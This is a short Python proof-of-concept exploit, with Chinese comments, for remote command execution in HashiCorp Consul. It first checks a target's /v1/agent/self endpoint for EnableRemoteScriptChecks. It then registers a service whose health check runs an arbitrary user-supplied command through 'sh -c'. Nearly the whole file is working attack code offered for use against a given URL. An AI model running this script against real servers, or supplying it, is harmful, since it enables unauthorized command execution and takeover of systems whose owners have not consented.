'''
consul-service-rce Hashicorp Consul Service API远程命令执行漏洞
writen by ophxc
漏洞简介：Consul工具在特定配置下可能导致远程命令执行（RCE）漏洞
漏洞条件：EnableRemoteScriptChecks：true
'''
import requests
import argparse
import json
parser=argparse.ArgumentParser(description="consul-rexec-rce")
parser.add_argument("-u","--url",help="the target url",required=True)
parser.add_argument("-c","--command",help="the command you want to excute")
args=parser.parse_args()

url=args.url
cmd=args.command
url3="http://"+url+"/v1/agent/service/register"

a=url
url="http://"+url+"/v1/agent/self"
res=requests.get(url=url)
if res.status_code ==200:
    text=res.text
    flag=json.loads(text)
    a = len(flag)
    flag=flag['DebugConfig']['EnableRemoteScriptChecks']
    print("the EnableRemoteScriptChecks on the server is :"+str(flag))
    if flag == True:
        print("so it's seem vulnable")
    else:
        exit("so it's seems unvulnable")
else:
    exit("it's difficult to check")

header = {
    "Host": str(a),
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
    'Accept-Encoding': 'gzip, deflate',
    'Connection':'close',
    'Content-Type': 'application/json'
}


if cmd is None:
    choice=input("so do you want to excute a command ?(y/n)")
    if choice == "y":
        cmd=input("cmd:")
poc='''
{
    "ID": "bpPeMfZuAN",
    "Name": "bpPeMfZuAN",
    "Address":"127.0.0.1",
    "Port":80,
    "check":{
                "script":"'''+cmd+'''",
                "Args": ["sh", "-c","'''+cmd+'''"],
                "interval":"10s",
                "Timeout":"86400s"
    }
}
'''
proxy = {
    'http': '127.0.0.1:8080'
}


res=requests.put(url=url3,headers=header,data=poc,proxies=proxy)
print("command is excute")


